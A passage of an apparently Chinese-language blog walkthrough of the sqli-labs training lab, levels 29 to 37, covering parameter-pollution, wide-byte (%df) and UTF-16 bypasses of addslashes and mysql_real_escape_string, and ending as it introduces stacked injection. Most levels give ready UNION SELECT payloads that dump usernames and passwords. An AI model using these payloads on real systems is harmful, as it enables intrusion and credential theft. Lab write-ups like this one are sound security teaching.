查询 query 的字符串</span><span class="token variable">$qs</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 模拟 tomcat 的查询函数 处理一下</span><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 再次过滤检测</span><span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> 查询到结果<span class="token punctuation">:</span>    输出查询的详细信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span><span class="token keyword">function</span> <span class="token function-definition function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>    <span class="token comment"># &amp; 作为分隔符 分割字符串</span>    <span class="token variable">$qs_array</span><span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># 遍历 qs_array 数组</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token variable">$val</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># 如果数组前两位是 id 的话</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token operator">==</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>            <span class="token variable">$id_value</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment"># 过滤规则 检测数字</span>    <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\d+$/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> 不符合规则：        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: hacked.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>whitelist<span class="token string backtick-quoted-string">` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `</span>hacked<span class="token operator">.</span>php<span class="token string backtick-quoted-string">`，这里是没毛病的。那么问题出在了这里函数`</span><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 在' " \ 等敏感字符前面添加反斜杠</span><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment"># \ 转换为 \\</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          将       <span class="token comment"># 将 ' 转为\"</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment"># 将 " 转为\"</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><ol><li><code>%df</code> 吃掉 <code>\</code></li></ol><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><ol><li>将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</li></ol><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th align="left">预定义字符</th><th align="left">转义后</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin%df&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>'<span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-16��<span class="token string">'➜  ~ echo \'</span><span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-32��'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先尝试一个经典的万能密码：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'�'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># where username = 'x' or 1</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'x'</span> or <span class="token number">1</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb          <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> Angelina      <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> Dummy         <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> secure        <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> stupid        <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> superman      <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> batman        <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> admin1        <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2        <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3        <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dhakkan       <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4        <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">21</span> <span class="token operator">|</span> admin<span class="token string">'#hacker | 111        |+----+---------------+------------+14 rows in set (0.00 sec)# where username = '</span>x<span class="token string">' or 0mysql> select * from users where username = '</span>x<span class="token string">' or 0;Empty set (0.00 sec)# where 1mysql> select * from users where 1;+----+---------------+------------+| id | username      | password   |+----+---------------+------------+|  1 | Dumb          | Dumb       ||  2 | Angelina      | I-kill-you ||  3 | Dummy         | p@ssword   ||  4 | secure        | crappy     ||  5 | stupid        | stupidity  ||  6 | superman      | genious    ||  7 | batman        | mob!le     ||  8 | admin         | 233        ||  9 | admin1        | admin1     || 10 | admin2        | admin2     || 11 | admin3        | admin3     || 12 | dhakkan       | dumbo      || 14 | admin4        | admin4     || 21 | admin'</span><span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span class="token number">14</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="token comment"># where 0</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token number">0</span><span class="token punctuation">;</span>Empty <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是本关的拼接方式是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_quotes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th align="left">危险字符</th><th align="left">转义后</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1�&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;%df&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>+-------------------------+<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span>+-------------------------+<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span>+-------------------------+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL Server</strong></p><pre class="line-numbers language-mssql" data-language="mssql"><code class="language-mssql">select 1,2,3;select * from test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Postgresql</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_test<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" 